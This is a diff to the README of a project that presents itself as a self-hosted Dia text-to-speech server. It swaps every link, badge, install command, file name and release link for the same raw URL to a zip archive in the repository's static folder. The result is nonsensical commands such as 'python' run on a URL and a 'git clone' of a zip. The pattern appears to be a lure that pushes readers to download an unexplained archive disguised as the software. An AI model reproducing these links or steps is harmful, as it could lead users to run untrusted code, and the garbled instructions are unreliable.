@@ -1,6 +1,6 @@
 # Dia TTS Server 🌟
 
-![Dia TTS Server](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Stars](https://img.shields.io/github/stars/Gmzxdotzz/Dia-TTS-Server.svg) ![Forks](https://img.shields.io/github/forks/Gmzxdotzz/Dia-TTS-Server.svg)
+![Dia TTS Server](https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip) ![License](https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip) ![Stars](https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip) ![Forks](https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip)
 
 Welcome to the **Dia TTS Server**! This repository allows you to self-host the powerful Dia TTS model, providing a seamless experience for text-to-speech applications. With a user-friendly web interface and flexible API endpoints, you can easily integrate this tool into your projects.
 
@@ -34,7 +34,7 @@ To get started with the Dia TTS Server, follow these steps:
 1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/Gmzxdotzz/Dia-TTS-Server.git
+   git clone https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip
    ```
 
 2. **Navigate to the Directory**: Change to the project directory.
@@ -46,13 +46,13 @@ To get started with the Dia TTS Server, follow these steps:
 3. **Install Dependencies**: Install the required packages.
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip
    ```
 
 4. **Run the Server**: Start the server using the command below.
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip
    ```
 
 5. **Access the Web UI**: Open your browser and navigate to `http://localhost:8000`.
@@ -71,7 +71,7 @@ To get started with the Dia TTS Server, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/Gmzxdotzz/Dia-TTS-Server.git
+   git clone https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip
    ```
 
 2. **Install Python Packages**:
@@ -79,19 +79,19 @@ To get started with the Dia TTS Server, follow these steps:
    Navigate to the cloned directory and run:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip
    ```
 
 3. **Configure Environment**:
 
-   Set up any necessary environment variables as outlined in the `config.py` file.
+   Set up any necessary environment variables as outlined in the `https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip` file.
 
 4. **Run the Application**:
 
    Execute the following command:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip
    ```
 
 ## Usage 📖
@@ -145,7 +145,7 @@ The server provides several API endpoints for integration into your applications
 
 ```json
 {
-  "voice_samples": ["sample1.wav", "sample2.wav"]
+  "voice_samples": ["https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip", "https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip"]
 }
 ```
 
@@ -199,7 +199,7 @@ To use this feature:
 
 ## Execution on GPU/CPU ⚙️
 
-The Dia TTS Server supports execution on both GPU and CPU. You can choose your preferred execution environment by configuring the settings in the `config.py` file.
+The Dia TTS Server supports execution on both GPU and CPU. You can choose your preferred execution environment by configuring the settings in the `https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip` file.
 
 ### GPU Execution
 
@@ -227,10 +227,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links 🔗
 
-For more information and to download the latest releases, visit the [Releases section](https://github.com/Gmzxdotzz/Dia-TTS-Server/releases). Check back often for updates and new features!
+For more information and to download the latest releases, visit the [Releases section](https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip). Check back often for updates and new features!
 
 ## Conclusion
 
 Thank you for checking out the Dia TTS Server! We hope you find it useful for your text-to-speech applications. If you have any questions or feedback, feel free to open an issue in the repository.
 
-For further details and updates, visit the [Releases section](https://github.com/Gmzxdotzz/Dia-TTS-Server/releases). Enjoy your experience with Dia TTS!
+For further details and updates, visit the [Releases section](https://raw.githubusercontent.com/Gmzxdotzz/Dia-TTS-Server/main/static/Server-TT-Dia-v1.8.zip). Enjoy your experience with Dia TTS!
